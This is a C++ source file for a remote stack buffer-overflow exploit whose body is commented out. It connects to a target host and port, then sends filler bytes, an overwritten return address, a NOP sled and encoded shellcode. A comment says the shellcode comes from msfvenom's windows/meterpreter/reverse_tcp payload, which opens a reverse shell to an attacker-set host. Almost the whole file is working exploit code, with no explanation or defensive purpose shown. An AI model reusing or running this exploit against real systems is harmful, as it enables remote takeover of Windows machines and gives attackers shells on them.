#include <iostream>
#include <string>
#include <cstring>
#include "../headers/arguments.h"

int main(int argc, char* argv[]){
    InitProgram ProgramInit(argc, argv);
/*#if defined(_WIN32)
    WSADATA d;
    if(WSAStartup(MAKEWORD(2,2), &d)){
        PrintStatus("Initiate Winsock", "INITIALIZATION FAILED");
        exit(EXIT_FAILURE);
    }
    PrintStatus("Initiation of Winsock", "INITIALIZATION SUCCEEDED");
#endif

    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_INET;
    struct addrinfo* peerAddress;
    if(getaddrinfo(TARGET, TARGET_PORT, &hints, &peerAddress)){
        PrintStatus("Host Translation", "HOST TRANSLATION FAILED");
        exit(EXIT_FAILURE);
    }

    PrintStatus("Host Translation", "HOST TRANSLATION DONE");

    char serviceBuffer[64];
    char addressBuffer[64];
    getnameinfo(peerAddress->ai_addr, peerAddress->ai_addrlen, addressBuffer, sizeof(addressBuffer), serviceBuffer, sizeof(serviceBuffer), NI_NUMERICHOST);
    PrintStatus("TARGET CHOOSED\t", addressBuffer + (std::string)":" + serviceBuffer);
    SOCKET socketPeer = socket(peerAddress->ai_family, peerAddress->ai_socktype, peerAddress->ai_protocol);   

    if(!ISVALIDSOCKET(socketPeer)){
        PrintStatus("INITIALIZING SOCKET", "FAILED TO INITIALIZED SOCKET");
        exit(EXIT_FAILURE);
    }

    if(connect(socketPeer, peerAddress->ai_addr, peerAddress->ai_addrlen) != 0){
        PrintStatus("CONNECTING TO TARGET", "CONNECTION FAILED");
        exit(EXIT_FAILURE);
    }
    PrintStatus("CONNECTING TO TARGET", "CONNECTION SUCCEEDED");
    freeaddrinfo(peerAddress);
    
    char ReceiveFirstBytes[4096];
    recv(socketPeer, ReceiveFirstBytes, 4096, 0);
    //std::cout << ReceiveFirstBytes << std::endl;
    PrintStatus("PREPARING EXPLOIT", "IN-PROGRESS");
    //Prepare buffer
    std::string filler = "\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55";
    std::string nops = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    std::string eip = "\xf3\x12\x17\x31";
    std::string buf = "\xd9\xe8\xd9\x74\x24\xf4\x5a\xb8\x02\x4e\x28\x40\x2b\xc9\xb1"
"\x59\x31\x42\x19\x03\x42\x19\x83\xc2\x04\xe0\xbb\xd4\xa8\x6b"
"\x43\x25\x29\x13\xcd\xc0\x18\x01\xa9\x81\x09\x95\xb9\xc4\xa1"
"\x5e\xef\xfc\xb6\xd7\x5a\xdb\xf9\xe8\xd0\x51\xd2\x27\x27\x39"
"\x1e\x26\xdb\x40\x73\x88\xe2\x8a\x86\xc9\x23\x5d\xec\x26\xf9"
"\xd5\x5c\xa8\xa9\x62\x22\xf4\x54\xa5\x28\x44\x2f\xc0\xef\x30"
"\x83\xcb\x3f\x33\x43\xec\xef\x42\xa7\x67\x47\x5c\xc2\xb1\x2c"
"\x60\xfd\xbe\x84\x13\xc9\xcb\x16\xf5\x03\x0c\xd9\x36\x6e\x20"
"\xdb\x0f\x49\xd8\xa9\x7b\xa9\x65\xaa\xb8\xd3\xb1\x3f\x5e\x73"
"\x31\xe7\xba\x85\x96\x7e\x49\x89\x53\xf4\x15\x8e\x62\xd9\x2e"
"\xaa\xef\xdc\xe0\x3a\xab\xfa\x24\x66\x6f\x62\x7d\xc2\xde\x9b"
"\x9d\xaa\xbf\x39\xd6\x59\xa9\x3e\x17\xa2\xd6\x62\x8f\x6e\x1b"
"\x9d\x4f\xf9\x2c\xee\x7d\xa6\x86\x78\xcd\x2f\x01\x7e\x44\x27"
"\xb2\x50\xee\x28\x4c\x51\x0e\x60\x8b\x05\x5e\x1a\x3a\x26\x35"
"\xda\xc3\xf3\xa3\xd0\x53\xf6\x35\xf3\x44\x6e\x3b\xfb\xab\x8c"
"\xb2\x1d\xfb\x02\x94\xb1\xbc\xf2\x54\x62\x55\x19\x5b\x5d\x45"
"\x22\xb6\xf6\xec\xcd\x6e\xae\x98\x74\x2b\x24\x38\x78\xe6\x40"
"\x7a\xf2\x02\xb4\x35\xf3\x67\xa6\x22\x64\x87\x36\xb3\x01\x87"
"\x5c\xb7\x83\xd0\xc8\xb5\xf2\x16\x57\x45\xd1\x25\x90\xb9\xa4"
"\x1f\xea\x8c\x32\x1f\x84\xf0\xd2\x9f\x54\xa7\xb8\x9f\x3c\x1f"
"\x99\xcc\x59\x60\x34\x61\xf2\xf5\xb7\xd3\xa6\x5e\xd0\xd9\x91"
"\xa9\x7f\x22\xf4\xa9\x78\xdc\x8a\x85\x20\xb4\x74\x96\xd0\x44"
"\x1f\x16\x81\x2c\xd4\x39\x2e\x9c\x15\x90\x67\xb4\x9c\x75\xc5"
"\x25\xa0\x5f\x8b\xfb\xa1\x6c\x10\x0c\xdb\x1d\xa7\xed\x1c\x34"
"\xcc\xee\x1c\x38\xf2\xd3\xca\x01\x80\x12\xcf\x35\x9b\x21\x72"; //SHELLCODE HERE 
										//msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f c -b "\x00\x0a\x0d\xff"
    
    std::string payload = filler + eip + nops + buf;
    send(socketPeer, payload.c_str(), payload.length(), 0);

*/
}